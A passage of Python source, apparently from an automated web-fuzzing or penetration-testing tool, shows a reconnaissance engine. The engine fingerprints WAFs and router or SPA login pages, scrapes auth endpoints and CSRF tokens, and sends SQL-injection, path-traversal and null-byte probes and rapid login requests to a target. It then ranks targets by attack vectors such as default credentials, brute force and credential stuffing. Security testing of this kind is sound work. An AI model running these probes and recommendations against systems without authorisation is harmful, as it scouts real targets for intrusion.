                    headers=headers,
                    cookies=cookies,
                    fetch_scripts=True,
                ),
                timeout=30.0  # 30 second timeout for passive recon
            )
        except asyncio.TimeoutError:
            logger.warning(f"Passive reconnaissance timed out for {target_url}")
            # Create minimal passive recon result
            result.passive_recon = ReconnaissanceResult(target_url=target_url)
        except Exception as e:
            logger.warning(f"Passive reconnaissance failed for {target_url}: {e}")
            result.passive_recon = ReconnaissanceResult(target_url=target_url)
        
        # Step 2: Detect WAF from headers (safe - no network calls)
        try:
            self._detect_waf(result, headers)
        except Exception as e:
            logger.debug(f"WAF detection failed: {e}")
        
        # Step 2.5: Detect JavaScript-rendered login UI (even without HTML forms)
        try:
            self._detect_js_login_page(result, html_content, target_url)
        except Exception as e:
            logger.debug(f"JS login detection failed: {e}")
        
        # Step 3: Analyze SRP protocol if detected (safe - no network calls)
        try:
            if (result.passive_recon and 
                result.passive_recon.authentication and 
                result.passive_recon.authentication.mechanism == AuthMechanism.SRP):
                await self._analyze_srp_protocol(result, html_content, target_url)
            # Also check if we detected SRP in JS login detection
            elif result.high_value_targets and any("srp" in str(t).lower() for t in result.high_value_targets):
                await self._analyze_srp_protocol(result, html_content, target_url)
        except Exception as e:
            logger.debug(f"SRP analysis failed: {e}")
        
        # Step 4: Active probing (if enabled) with comprehensive error handling
        if active_probing:
            try:
                await asyncio.wait_for(
                    self._probe_common_endpoints(result, target_url, probe_depth),
                    timeout=60.0  # 60 second timeout for all endpoint probing
                )
            except asyncio.TimeoutError:
                logger.warning(f"Endpoint probing timed out for {target_url}")
            except Exception as e:
                logger.warning(f"Endpoint probing failed for {target_url}: {e}")
            
            try:
                await asyncio.wait_for(
                    self._analyze_error_behavior(result, target_url),
                    timeout=15.0
                )
            except asyncio.TimeoutError:
                logger.debug(f"Error behavior analysis timed out for {target_url}")
            except Exception as e:
                logger.debug(f"Error behavior analysis failed: {e}")
            
            try:
                await asyncio.wait_for(
                    self._probe_rate_limiting(result, target_url),
                    timeout=15.0
                )
            except asyncio.TimeoutError:
                logger.debug(f"Rate limit probing timed out for {target_url}")
            except Exception as e:
                logger.debug(f"Rate limit probing failed: {e}")
        
        # Step 5: Analyze authentication flow (safe - no network calls)
        try:
            await self._analyze_auth_flow(result, target_url, html_content)
        except Exception as e:
            logger.debug(f"Auth flow analysis failed: {e}")
        
        # Step 6: Generate attack recommendations (safe - no network calls)
        try:
            self._generate_recommendations(result)
        except Exception as e:
            logger.debug(f"Recommendation generation failed: {e}")
        
        return result
    
    def _detect_waf(self, result: IntelligentReconResult, headers: Dict[str, str]):
        """Detect WAF presence from headers."""
        if not headers:
            return
            
        try:
            headers_lower = {k.lower(): (v.lower() if isinstance(v, str) else str(v).lower()) 
                           for k, v in headers.items() if k and v}
            combined = " ".join(headers_lower.keys()) + " " + " ".join(headers_lower.values())
            
            for waf_name, signatures in self.WAF_SIGNATURES.items():
                for sig in signatures:
                    if sig.lower() in combined:
                        result.waf_detected = True
                        result.waf_type = waf_name
                        return
            
            # Check for generic WAF indicators
            if "x-waf" in headers_lower or "x-firewall" in headers_lower:
                result.waf_detected = True
                result.waf_type = "unknown"
        except Exception as e:
            logger.debug(f"WAF detection error: {e}")
    
    def _detect_js_login_page(
        self, 
        result: IntelligentReconResult, 
        html: str,
        base_url: str
    ):
        """
        Detect JavaScript-rendered login pages that don't use traditional HTML forms.
        This is critical for:
        - Single Page Applications (React, Vue, Angular)
        - Router/IoT device admin panels (Vodafone, Huawei, etc.)
        - SRP-based authentication systems
        """
        html = html or ""
        findings = {
            "login_ui_detected": False,
            "srp_detected": False,
            "router_detected": False,
            "username_field": None,
            "password_field": None,
            "login_endpoint": None,
            "evidence": [],
        }
        
        # Check for JavaScript-rendered login UI elements
        for category, patterns in self.JS_LOGIN_UI_PATTERNS.items():
            for pattern in patterns:
                try:
                    matches = re.findall(pattern, html, re.IGNORECASE)
                    if matches:
                        findings["evidence"].append(f"{category}: {pattern[:40]}")
                        if category == "login_forms":
                            findings["login_ui_detected"] = True
                            # Try to extract field names
                            if "username" in pattern or "user" in pattern:
                                name_match = re.search(r'(?:id|name)=["\']([^"\']+)["\']', 
                                                      matches[0] if isinstance(matches[0], str) else str(matches[0]))
                                if name_match:
                                    findings["username_field"] = name_match.group(1)
                            if "password" in pattern or "pass" in pattern:
                                name_match = re.search(r'(?:id|name)=["\']([^"\']+)["\']',
                                                      matches[0] if isinstance(matches[0], str) else str(matches[0]))
                                if name_match:
                                    findings["password_field"] = name_match.group(1)
                        elif category == "js_auth_init":
                            findings["login_ui_detected"] = True
                            if "srp" in pattern.lower():
                                findings["srp_detected"] = True
                        elif category == "router_ui_patterns":
                            findings["router_detected"] = True
                except Exception as e:
                    logger.debug(f"Pattern match error in JS login detection: {e}")
        
        # Look for SRP library references more deeply
        srp_patterns = [
            r'<script[^>]+src=["\'][^"\']*srp[^"\']*\.js["\']',
            r'srp[-_]?(min|client|lib)?\.js',
            r'SecureRemotePassword',
            r'srpClient',
            r'SRP6[a]?(?:Client|Server)?',
            r'srp\s*[=:]\s*(?:new|require|import)',
        ]
        for pattern in srp_patterns:
            try:
                if re.search(pattern, html, re.IGNORECASE):
                    findings["srp_detected"] = True
                    findings["login_ui_detected"] = True
                    findings["evidence"].append(f"SRP library: {pattern[:30]}")
            except Exception:
                pass
        
        # Look for API endpoints in JavaScript that handle auth - ENHANCED for routers
        auth_api_patterns = [
            # Standard API patterns
            r'["\']/?api/(?:auth|user|session|login)[/"]?["\']',
            r'["\']/?(?:identify|authenticate|challenge)["\']',
            r'POST["\s,]+["\']([^"\']+(?:auth|login|identify|authenticate)[^"\']*)["\']',
            r'fetch\s*\(["\']([^"\']*(?:auth|login|session)[^"\']*)["\']',
            r'axios\.(?:post|get)\(["\']([^"\']*(?:auth|login|session)[^"\']*)["\']',
            # Router/IoT specific auth patterns
            r'["\']/?api/(?:auth/)?identify["\']',
            r'["\']/?api/(?:auth/)?authenticate["\']',
            r'["\']/?(?:cgi-bin|goform)/(?:login|auth|session)[^"\']*["\']',
            r'(?:loginUrl|authUrl|identifyUrl|authenticateUrl)\s*[:=]\s*["\']([^"\']+)["\']',
            r'url\s*[:=]\s*["\']([^"\']*(?:login|auth|identify|authenticate)[^"\']*)["\']',
            # SRP-specific endpoint patterns
            r'srp\s*\.\s*(?:identify|authenticate)\s*\(\s*["\']?([^"\')\s,]+)',
            r'SRP\s*\.\s*(?:init|setup)\s*\(\s*\{[^}]*url\s*:\s*["\']([^"\']+)["\']',
            # Generic form action patterns for JS-rendered forms
            r'(?:action|submitUrl|formAction)\s*[:=]\s*["\']([^"\']+)["\']',
            # Vodafone-specific patterns - srp.identify("/authenticate", ...)
            r'srp\.identify\s*\(\s*["\']([^"\']+)["\']',
            # .lp endpoints (Vodafone login pages)
            r'["\']([^"\']*\.lp)["\']',
            r'\.get\s*\(\s*["\']([^"\']*login\.lp[^"\']*)["\']',
            # CSRF token refresh endpoints
            r'action\s*:\s*["\']([^"\']+)["\']',
        ]
        found_endpoints = []
        for pattern in auth_api_patterns:
            try:
                matches = re.findall(pattern, html, re.IGNORECASE)
                for match in matches:
                    if match:
                        endpoint = match if isinstance(match, str) else match[0]
                        if endpoint and len(endpoint) > 1 and endpoint not in ('/', '//'):
                            found_endpoints.append(endpoint)
                            findings["evidence"].append(f"Auth endpoint: {endpoint[:50]}")
            except Exception:
                pass
        
        # Set the most specific endpoint found
        if found_endpoints:
            # Prioritize endpoints with 'identify', 'authenticate', or 'login' in path
            priority_order = ['identify', 'authenticate', 'login', 'auth', 'session']
            for keyword in priority_order:
                for ep in found_endpoints:
                    if keyword in ep.lower():
                        findings["login_endpoint"] = ep
                        break
                if findings["login_endpoint"]:
                    break
            # Fallback to first found
            if not findings["login_endpoint"]:
                findings["login_endpoint"] = found_endpoints[0]
        
        # Look for router-specific indicators
        router_indicators = [
            r'vodafone|huawei|sagemcom|technicolor|netgear|dlink|tplink|asus|zyxel',
            r'router\s*(?:login|admin|config)',
            r'gateway\s*(?:login|admin|portal)',
            r'wifi\s*(?:hub|box|router)',
            r'cgi-bin|goform|htdocs',
            # Vendor names
            r'vodafone|huawei|sagemcom|technicolor|netgear|dlink|tplink|asus|zyxel|linksys|cisco|ubiquiti|mikrotik|arris',
        ]
        for pattern in router_indicators:
            try:
                if re.search(pattern, html, re.IGNORECASE):
                    findings["router_detected"] = True
                    findings["evidence"].append(f"Router indicator: {pattern[:30]}")
            except Exception:
                pass
        
        # GENERAL: Extract login form fields - works for ANY device, not vendor-specific
        login_field_patterns = {
            # Hidden username field with value (common in router UIs)
            "default_username": r'<input[^>]+type=["\']?hidden["\']?[^>]+(?:id|name)=["\'][^"\']*(?:user|uname|login)[^"\']*["\'][^>]+value=["\']([^"\']+)["\']',
            "default_username_alt": r'<input[^>]+(?:id|name)=["\'][^"\']*(?:user|uname|login)[^"\']*["\'][^>]+type=["\']?hidden["\']?[^>]+value=["\']([^"\']+)["\']',
            # Password field
            "password_field": r'<input[^>]+type=["\']password["\'][^>]+(?:id|name)=["\']([^"\']+)["\']',
            "password_field_alt": r'<input[^>]+(?:id|name)=["\']([^"\']*(?:pass|pwd)[^"\']*)["\'][^>]+type=["\']password["\']',
            # Form ID
            "form_id": r'<form[^>]+id=["\']([^"\']*(?:login|auth|signin)[^"\']*)["\']',
            # CSRF tokens - multiple common names
            "csrf_token": r'<meta\s+name=["\'](?:csrf|_csrf|xsrf|CSRFtoken)[^"\']*["\'][^>]+content=["\']([^"\']+)["\']',
            "csrf_token_input": r'<input[^>]+name=["\'](?:csrf|_csrf|xsrf|_token)[^"\']*["\'][^>]+value=["\']([^"\']+)["\']',
            # Username field ID/name
            "username_field": r'<input[^>]+(?:id|name)=["\']([^"\']*(?:user|uname|login|email)[^"\']*)["\'][^>]+type=["\'](?:text|email)["\']',
        }
        for key, pattern in login_field_patterns.items():
            try:
                match = re.search(pattern, html, re.IGNORECASE)
                if match:
                    value = match.group(1)[:50] if match.group(1) else ""
                    findings["evidence"].append(f"Login field ({key}): {value}")
                    if "default_username" in key and value:
                        findings["default_username"] = value
                    elif key == "password_field" or key == "password_field_alt":
                        findings["password_field"] = value
                    elif key == "username_field":
                        findings["username_field"] = value
                    elif "csrf_token" in key:
                        findings["csrf_token"] = value
            except Exception:
                pass
        
        # If we detected a login page, add it to high value targets
        if findings["login_ui_detected"] or findings["srp_detected"] or findings["router_detected"]:
            target_info = {
                "type": "js_rendered_login_page",
                "endpoint": base_url,
                "description": "JavaScript-rendered login page detected (no traditional HTML form)",
                "details": findings,
                "attack_vectors": [],
                "priority": "critical",
            }
            
            if findings["srp_detected"]:
                target_info["type"] = "srp_login_page"
                target_info["description"] = "SRP (Secure Remote Password) authentication detected"
                target_info["attack_vectors"] = [
                    "SRP implementation vulnerabilities",
                    "Weak parameter generation",
                    "Session token weakness post-auth",
                    "Salt enumeration attacks",
                    "Timing side-channel attacks",
                ]
            
            if findings["router_detected"]:
                target_info["type"] = "router_admin_panel"
                target_info["description"] = "Router/IoT device admin panel detected"
                target_info["attack_vectors"] = [
                    "Default credentials",
                    "Command injection in config pages",
                    "CSRF on admin functions",
                    "Backup file download",
                    "Firmware upload vulnerabilities",
                    "XSS in device name/SSID fields",
                ]
            
            if findings["login_endpoint"]:
                target_info["login_endpoint"] = findings["login_endpoint"]
                target_info["endpoints"] = [findings["login_endpoint"]]
            
            result.high_value_targets.append(target_info)
            
            # Update passive recon auth info if not already set
            if result.passive_recon and result.passive_recon.authentication:
                auth = result.passive_recon.authentication
                if auth.mechanism == AuthMechanism.UNKNOWN:
                    if findings["srp_detected"]:
                        auth.mechanism = AuthMechanism.SRP
                    else:
                        auth.mechanism = AuthMechanism.CUSTOM
                
                if findings["login_endpoint"] and not auth.login_endpoint:
                    auth.login_endpoint = urllib.parse.urljoin(base_url, findings["login_endpoint"])
                    auth.auth_endpoint = auth.login_endpoint
                
                if findings.get("username_field") and not auth.username_field:
                    auth.username_field = findings["username_field"]
                if findings.get("password_field") and not auth.password_field:
                    auth.password_field = findings["password_field"]
            
            logger.info(f"Detected JS-rendered login page on {base_url}: {target_info['type']}")
    
    async def _analyze_srp_protocol(
        self, 
        result: IntelligentReconResult, 
        html: str, 
        base_url: str
    ):
        """Deep analysis of SRP (Secure Remote Password) protocol."""
        srp_info = {
            "protocol_detected": True,
            "library_found": None,
            "auth_endpoints": [],
            "challenge_response_detected": False,
            "implementation_details": [],
        }
        
        # Check auth library patterns (works for SRP, OAuth, custom auth, etc.)
        for category, patterns in self.AUTH_LIBRARY_PATTERNS.items():
            for pattern in patterns:
                try:
                    matches = re.findall(pattern, html, re.IGNORECASE)
                    if matches:
                        if category == "srp_library":
                            srp_info["library_found"] = matches[0] if matches else "Auth library"
                        elif category == "auth_method_calls":
                            # Extract endpoints from obj.method("/endpoint", ...) patterns
                            for match in matches:
                                if isinstance(match, tuple) and len(match) >= 2:
                                    endpoint = match[1] if match[1].startswith('/') else match[0]
                                    if endpoint and endpoint.startswith('/'):
                                        srp_info["auth_endpoints"].append(endpoint)
                        elif category == "auth_url_vars":
                            # Extract endpoints from URL variable assignments
                            for match in matches:
                                endpoint = match if isinstance(match, str) else match[0] if match else None
                                if endpoint and endpoint.startswith('/'):
                                    srp_info["auth_endpoints"].append(endpoint)
                        elif category == "challenge_response":
                            srp_info["challenge_response_detected"] = True
                            srp_info["implementation_details"].append(f"Found {category}: {pattern[:30]}")
                except Exception:
                    pass
        
        # Deduplicate endpoints
        srp_info["auth_endpoints"] = list(set(srp_info["auth_endpoints"]))
        
        # Update authentication info with discovered details
        if result.passive_recon and result.passive_recon.authentication:
            result.passive_recon.authentication.srp_details = srp_info
            
            # Set auth flow complexity
            if srp_info["challenge_response_detected"]:
                result.auth_flow_complexity = "challenge-response"
            
            # Create auth flow steps for discovered endpoints
            for i, endpoint in enumerate(srp_info["auth_endpoints"][:3]):  # Max 3 endpoints
                result.auth_flow_steps.append(AuthFlowStep(
                    order=i + 1,
                    endpoint=endpoint,
                    method="POST",
                    required_parameters=["username", "password"] if i == 0 else ["token"],
                    expected_response="challenge" if i == 0 else "token",
                    produces=["session_token"] if i == len(srp_info["auth_endpoints"]) - 1 else ["challenge"],
                ))
        
        # Add discovered auth endpoints to high value targets
        if srp_info["auth_endpoints"]:
            result.high_value_targets.append({
                "type": "discovered_auth_endpoints",
                "description": f"Auth endpoints extracted from JavaScript: {', '.join(srp_info['auth_endpoints'])}",
                "endpoints": srp_info["auth_endpoints"],
                "attack_vectors": [
                    "Authentication bypass",
                    "Credential stuffing",
                    "Brute force",
                    "Session hijacking",
                    "Token manipulation",
                ],
                "priority": "critical",
            })
    
    async def _probe_common_endpoints(
        self, 
        result: IntelligentReconResult, 
        base_url: str,
        probe_depth: str
    ):
        """Probe common endpoints to discover APIs and admin panels.
        
        Robust implementation that handles:
        - Invalid URLs
        - Network failures
        - Timeouts per endpoint
        - Server overload prevention
        """
        try:
            client = await self._get_client()
        except Exception as e:
            logger.warning(f"Failed to get HTTP client for probing: {e}")
            return
        
        try:
            parsed = urllib.parse.urlparse(base_url)
            if not parsed.scheme or not parsed.netloc:
                logger.warning(f"Invalid base URL for probing: {base_url}")
                return
            base = f"{parsed.scheme}://{parsed.netloc}"
        except Exception as e:
            logger.warning(f"Failed to parse URL {base_url}: {e}")
            return
        
        # Determine how many endpoints to probe
        endpoints_to_probe = self.COMMON_ENDPOINTS[:15]  # minimal
        if probe_depth == "normal":
            endpoints_to_probe = self.COMMON_ENDPOINTS[:30]
        elif probe_depth == "aggressive":
            endpoints_to_probe = self.COMMON_ENDPOINTS
        
        # Probe endpoints concurrently in batches with error isolation
        batch_size = 5
        consecutive_failures = 0
        max_consecutive_failures = 3  # Stop if server seems down
        
        for i in range(0, len(endpoints_to_probe), batch_size):
            # Check if we should stop due to repeated failures
            if consecutive_failures >= max_consecutive_failures:
                logger.info(f"Stopping endpoint probing after {consecutive_failures} consecutive failures")
                break
            
            batch = endpoints_to_probe[i:i + batch_size]
            tasks = [self._probe_endpoint(client, base, ep) for ep in batch]
            
            try:
                results_batch = await asyncio.wait_for(
                    asyncio.gather(*tasks, return_exceptions=True),
                    timeout=20.0  # 20 second timeout per batch
                )
            except asyncio.TimeoutError:
                logger.debug(f"Batch probe timed out for endpoints starting at index {i}")
                consecutive_failures += 1
                continue
            
            batch_success = False
            for probe in results_batch:
                if isinstance(probe, Exception):
                    continue  # Skip exceptions
                    
                if isinstance(probe, ProbeResult):
                    result.common_endpoint_probes.append(probe)
                    
                    # Count as success if we got any valid response (even 404)
                    if probe.status_code > 0:
                        batch_success = True
                    
                    # Analyze interesting findings
                    if probe.status_code == 200:
                        # Check for API documentation
                        if any(doc in probe.endpoint for doc in ["/swagger", "/openapi", "/docs", "/api-docs"]):
                            result.api_documentation_url = f"{base}{probe.endpoint}"
                        
                        # Check for GraphQL
                        if "graphql" in probe.endpoint.lower():
                            result.high_value_targets.append({
                                "type": "graphql_endpoint",
                                "endpoint": f"{base}{probe.endpoint}",
                                "priority": "high",
                            })
                        
                        # Check for admin panels
                        if any(admin in probe.endpoint for admin in ["/admin", "/dashboard", "/manage"]):
                            result.high_value_targets.append({
                                "type": "admin_panel",
                                "endpoint": f"{base}{probe.endpoint}",
                                "priority": "high",
                            })
                    
                    # Detect API version from successful probes
                    if probe.status_code in [200, 301, 302] and probe.endpoint and "/api/v" in probe.endpoint:
                        version_match = re.search(r'/api/(v\d+)', probe.endpoint)
                        if version_match:
                            result.api_version_detected = version_match.group(1)
            
            # Update consecutive failures counter
            if batch_success:
                consecutive_failures = 0
            else:
                consecutive_failures += 1
            
            # Small delay between batches to avoid triggering rate limits
            await asyncio.sleep(0.15)
    
    async def _probe_endpoint(
        self, 
        client: httpx.AsyncClient, 
        base_url: str, 
        endpoint: str
    ) -> ProbeResult:
        """Probe a single endpoint with comprehensive error handling.
        
        Handles:
        - Connection errors
        - SSL errors
        - Timeouts
        - Malformed responses
        - Encoding issues
        """
        url = f"{base_url}{endpoint}"
        start_time = time.time()
        
        try:
            response = await asyncio.wait_for(
                client.get(url, follow_redirects=False),
                timeout=8.0  # 8 second timeout per endpoint
            )
            elapsed_ms = (time.time() - start_time) * 1000
            
            # Track redirects safely
            redirects = []
            if response.status_code in [301, 302, 303, 307, 308]:
                location = response.headers.get("location", "")
                if location:
                    redirects.append(location)
            
            # Detect behaviors safely
            behaviors = []
            if response.status_code == 401:
                behaviors.append("requires_auth")
            if response.status_code == 403:
                behaviors.append("forbidden")
            location_header = response.headers.get("location", "")
            if location_header and "login" in location_header.lower():
                behaviors.append("redirects_to_login")
            
            # Safe body preview extraction
            body_preview = ""
            try:
                text = response.text
                if text:
                    body_preview = text[:200]
            except Exception:
                pass  # Encoding issues, binary content, etc.
            
            # Safe content length
            try:
                content_length = len(response.content)
            except Exception:
                content_length = 0
            
            return ProbeResult(
                endpoint=endpoint,
                method="GET",
                status_code=response.status_code,
                response_time_ms=elapsed_ms,
                headers=dict(response.headers) if response.headers else {},
                content_type=response.headers.get("content-type", ""),
                content_length=content_length,
                body_preview=body_preview,
                redirects=redirects,
                behaviors=behaviors,
            )
        except asyncio.TimeoutError:
            return ProbeResult(
                endpoint=endpoint,
                method="GET",
                status_code=0,
                response_time_ms=(time.time() - start_time) * 1000,
                headers={},
                errors=["timeout"],
            )
        except httpx.ConnectError as e:
            return ProbeResult(
                endpoint=endpoint,
                method="GET",
                status_code=0,
                response_time_ms=(time.time() - start_time) * 1000,
                headers={},
                errors=[f"connection_error: {str(e)[:100]}"],
            )
        except httpx.ReadError as e:
            return ProbeResult(
                endpoint=endpoint,
                method="GET",
                status_code=0,
                response_time_ms=(time.time() - start_time) * 1000,
                headers={},
                errors=[f"read_error: {str(e)[:100]}"],
            )
        except Exception as e:
            return ProbeResult(
                endpoint=endpoint,
                method="GET",
                status_code=0,
                response_time_ms=(time.time() - start_time) * 1000,
                headers={},
                errors=[f"{type(e).__name__}: {str(e)[:100]}"],
            )
    
    async def _analyze_error_behavior(self, result: IntelligentReconResult, base_url: str):
        """Analyze how the server handles errors to detect information disclosure.
        
        Robust implementation with proper error handling and timeouts.
        """
        try:
            client = await self._get_client()
        except Exception as e:
            logger.debug(f"Failed to get HTTP client for error analysis: {e}")
            return
        
        try:
            parsed = urllib.parse.urlparse(base_url)
            if not parsed.scheme or not parsed.netloc:
                return
            base = f"{parsed.scheme}://{parsed.netloc}"
        except Exception:
            return
        
        # Test different error conditions
        error_tests = [
            (f"{base}/nonexistent-page-{random.randint(10000, 99999)}", "404"),
            (f"{base}/%00", "null_byte"),
            (f"{base}/..;/", "path_traversal"),
            (f"{base}/?id=1'", "sqli_probe"),
            (f"{base}/?debug=true", "debug_param"),
        ]
        
        disclosure_score = 0
        
        for url, test_type in error_tests:
            try:
                response = await asyncio.wait_for(
                    client.get(url),
                    timeout=5.0
                )
                
                # Safe body extraction
                try:
                    body = response.text.lower() if response.text else ""
                except Exception:
                    body = ""
                
                # Check for verbose errors
                verbose_indicators = [
                    "stack trace", "traceback", "exception", "error at line",
                    "sql syntax", "mysql", "postgresql", "sqlite",
                    "undefined variable", "undefined index",
                    "file path:", "c:\\", "/var/", "/home/",
                    "debug", "development mode",
                ]
                
                found_indicator = False
                for indicator in verbose_indicators:
                    if indicator in body:
                        disclosure_score += 1
                        result.error_responses[test_type] = f"Verbose ({indicator})"
                        found_indicator = True
                        break
                
                if not found_indicator and response.status_code >= 400:
                    result.error_responses[test_type] = "Minimal"
                        
            except asyncio.TimeoutError:
                result.error_responses[test_type] = "Timeout"
            except Exception as e:
                logger.debug(f"Error testing {test_type}: {e}")
        
        # Determine disclosure level
        if disclosure_score >= 3:
            result.error_disclosure_level = "verbose"
            result.server_quirks.append("Verbose error messages")
        elif disclosure_score >= 1:
            result.error_disclosure_level = "partial"
        else:
            result.error_disclosure_level = "minimal"
    
    async def _probe_rate_limiting(self, result: IntelligentReconResult, base_url: str):
        """Probe to understand rate limiting behavior.
        
        Robust implementation that won't crash on network issues.
        """
        try:
            client = await self._get_client()
        except Exception as e:
            logger.debug(f"Failed to get HTTP client for rate limit probing: {e}")
            return
        
        try:
            parsed = urllib.parse.urlparse(base_url)
            if not parsed.scheme or not parsed.netloc:
                return
            base = f"{parsed.scheme}://{parsed.netloc}"
        except Exception:
            return
        
        # Find an auth endpoint to test
        auth_endpoint = None
        try:
            if result.passive_recon and result.passive_recon.authentication:
                auth_endpoint = result.passive_recon.authentication.login_endpoint
        except Exception:
            pass
        
        if not auth_endpoint:
            auth_endpoint = f"{base}/login"
        
        # Send rapid requests to detect rate limiting
        rate_limited = False
        request_count = 0
        
        try:
            for i in range(10):  # Send 10 rapid requests
                try:
                    response = await asyncio.wait_for(
                        client.get(auth_endpoint),
                        timeout=5.0
                    )
                    request_count += 1
                    
                    # Check for rate limiting indicators
                    if response.status_code == 429:
                        rate_limited = True
                        result.rate_limit_threshold = request_count
                        
                        # Try to extract rate limit window
                        retry_after = response.headers.get("retry-after", "")
                        if retry_after:
                            try:
                                result.rate_limit_window_seconds = int(retry_after)
                            except (ValueError, TypeError):
                                pass
                        break
                    
                    # Check rate limit headers safely
                    headers_lower = {h.lower(): v for h, v in response.headers.items()}
                    for header in ["x-ratelimit-remaining", "x-rate-limit-remaining"]:
                        if header in headers_lower:
                            remaining = headers_lower.get(header, "")
                            try:
                                if int(remaining) < 5:
                                    rate_limited = True
                            except (ValueError, TypeError):
                                pass
                    
                    await asyncio.sleep(0.05)  # 50ms between requests
                    
                except asyncio.TimeoutError:
                    break  # Server slow, stop probing
                except Exception:
                    break  # Network issue, stop probing
                    
        except Exception as e:
            logger.debug(f"Rate limit probing failed: {e}")
        
        if not rate_limited and request_count >= 10:
            result.server_quirks.append("No rate limiting detected on auth endpoint")
            result.rate_limit_bypass_possible = True
    
    async def _analyze_auth_flow(
        self, 
        result: IntelligentReconResult, 
        base_url: str,
        html: str
    ):
        """Analyze authentication flow complexity."""
        if not result.passive_recon or not result.passive_recon.authentication:
            return
        
        auth = result.passive_recon.authentication
        
        # Determine session mechanism
        if auth.cookies_required:
            result.session_mechanism = "cookie"
            result.session_token_location = "cookie"
        elif auth.mechanism in [AuthMechanism.JWT, AuthMechanism.BEARER]:
            result.session_mechanism = "token"
            result.session_token_location = "header"
        elif auth.mechanism == AuthMechanism.SRP:
            result.session_mechanism = "hybrid"
            result.session_token_location = "cookie"  # Usually cookie after SRP
        else:
            result.session_mechanism = "cookie"  # Default assumption
        
        # Analyze flow complexity based on what we found
        if not result.auth_flow_steps:  # Not already set by SRP analysis
            if auth.mfa_detected:
                result.auth_flow_complexity = "multi-step"
                result.auth_flow_steps.append(AuthFlowStep(
                    order=1,
                    endpoint=auth.login_endpoint or "/login",
                    method="POST",
                    required_parameters=[auth.username_field or "username", auth.password_field or "password"],
                    expected_response="mfa_challenge",
                    produces=["mfa_token"],
                ))
                result.auth_flow_steps.append(AuthFlowStep(
                    order=2,
                    endpoint="/verify-mfa",  # Assumed
                    method="POST",
                    required_parameters=["mfa_code", "mfa_token"],
                    expected_response="session",
                    produces=["session_token"],
                ))
            elif auth.mechanism == AuthMechanism.OAUTH2:
                result.auth_flow_complexity = "multi-step"
                result.auth_flow_steps.append(AuthFlowStep(
                    order=1,
                    endpoint=auth.oauth_endpoints.get("authorize", "/oauth/authorize"),
                    method="GET",
                    required_parameters=["client_id", "redirect_uri", "response_type", "scope"],
                    expected_response="redirect",
                    produces=["authorization_code"],
                ))
                result.auth_flow_steps.append(AuthFlowStep(
                    order=2,
                    endpoint=auth.oauth_endpoints.get("token", "/oauth/token"),
                    method="POST",
                    required_parameters=["grant_type", "code", "redirect_uri", "client_id"],
                    expected_response="token",
                    produces=["access_token", "refresh_token"],
                ))
            else:
                result.auth_flow_complexity = "simple"
                result.auth_flow_steps.append(AuthFlowStep(
                    order=1,
                    endpoint=auth.login_endpoint or "/login",
                    method="POST",
                    required_parameters=[auth.username_field or "username", auth.password_field or "password"],
                    expected_response="session",
                    produces=["session_token"],
                ))
    
    def _generate_recommendations(self, result: IntelligentReconResult):
        """Generate attack technique recommendations based on findings."""
        recommendations = []
        
        if not result.passive_recon:
            return
        
        auth = result.passive_recon.authentication
        security = result.passive_recon.security_features
        
        # Authentication-based recommendations
        if auth:
            if auth.mechanism == AuthMechanism.SRP:
                recommendations.extend([
                    "SRP implementation analysis",
                    "Session token security after SRP auth",
                    "Timing attacks on SRP verification",
                ])
            
            if auth.mechanism == AuthMechanism.JWT:
                recommendations.append("JWT_ATTACK")
            
            if auth.mechanism == AuthMechanism.OAUTH2:
                recommendations.append("OAUTH_ATTACK")
            
            if not auth.csrf_token_value and auth.login_endpoint:
                recommendations.append("CSRF on authentication")
            
            if auth.lockout_detected:
                recommendations.append("Account lockout bypass testing")
            
            if not auth.rate_limit_detected:
                recommendations.append("CREDENTIAL_STUFFING")
        
        # Security features-based recommendations
        if security:
            if not security.csrf_protection:
                recommendations.append("CSRF attacks on state-changing endpoints")
            
            if security.cors_allow_origin == "*":
                recommendations.append("CORS exploitation")
            
            if not security.content_security_policy:
                recommendations.append("XSS")
        
        # WAF-based recommendations
        if result.waf_detected:
            recommendations.append("WAF bypass techniques")
            result.server_quirks.append(f"WAF detected: {result.waf_type}")
        
        # Error disclosure-based recommendations
        if result.error_disclosure_level == "verbose":
            recommendations.extend([
                "Information gathering from errors",
                "SQL_INJECTION (verbose errors may reveal structure)",
            ])
        
        # Rate limiting-based recommendations
        if result.rate_limit_bypass_possible:
            recommendations.extend([
                "Brute force attacks",
                "Credential stuffing",
                "Rate limit bypass techniques",
            ])
        
        # API documentation-based recommendations
        if result.api_documentation_url:
            recommendations.append("API endpoint fuzzing based on documentation")
        
        result.recommended_techniques = list(set(recommendations))


# Global intelligent reconnaissance engine
_intelligent_recon_engine = IntelligentReconnaissanceEngine()


async def perform_intelligent_reconnaissance(
    target_url: str,
    html_content: str,
    headers: Dict[str, str],
    cookies: List[str] = None,
    active_probing: bool = True,
    probe_depth: str = "normal",
) -> IntelligentReconResult:
    """
    Convenience function to perform intelligent reconnaissance.
    
    This function is designed to NEVER crash - it will always return a valid
    IntelligentReconResult, even if all internal operations fail.
    
    Args:
        target_url: The target URL to analyze
        html_content: HTML content of the target page (can be None/empty)
        headers: Response headers (can be None/empty)
        cookies: Response cookies (optional)
        active_probing: Whether to actively probe endpoints (default True)
        probe_depth: How many endpoints to probe (minimal/normal/aggressive)
        
    Returns:
        IntelligentReconResult - always returns a valid result, never None or exception
    """
    try:
        return await asyncio.wait_for(
            _intelligent_recon_engine.perform_intelligent_recon(
                target_url=target_url,
                html_content=html_content or "",
                headers=headers or {},
                cookies=cookies or [],
                active_probing=active_probing,
                probe_depth=probe_depth,
            ),
            timeout=120.0  # 2 minute overall timeout
        )
    except asyncio.TimeoutError:
        logger.warning(f"Intelligent reconnaissance timed out for {target_url}")
        return IntelligentReconResult(target_url=target_url)
    except Exception as e:
        logger.warning(f"Intelligent reconnaissance failed for {target_url}: {e}")
        return IntelligentReconResult(target_url=target_url)


# =============================================================================
# ENUMS AND TYPES
# =============================================================================

class FuzzingPhase(str, Enum):
    """Phases of agentic fuzzing."""
    RECONNAISSANCE = "reconnaissance"
    FINGERPRINTING = "fingerprinting"
    DISCOVERY = "discovery"
    TECHNIQUE_SELECTION = "technique_selection"
    PAYLOAD_EXECUTION = "payload_execution"
    RESULT_ANALYSIS = "result_analysis"
    BLIND_DETECTION = "blind_detection"
    WAF_EVASION = "waf_evasion"
    CHAIN_EXPLOITATION = "chain_exploitation"
    EXPLOITATION = "exploitation"
    POC_GENERATION = "poc_generation"
    REPORTING = "reporting"
    COMPLETED = "completed"


class FuzzingTechnique(str, Enum):
    """Available fuzzing techniques."""
    # Classic Web Vulnerabilities
    SQL_INJECTION = "sql_injection"
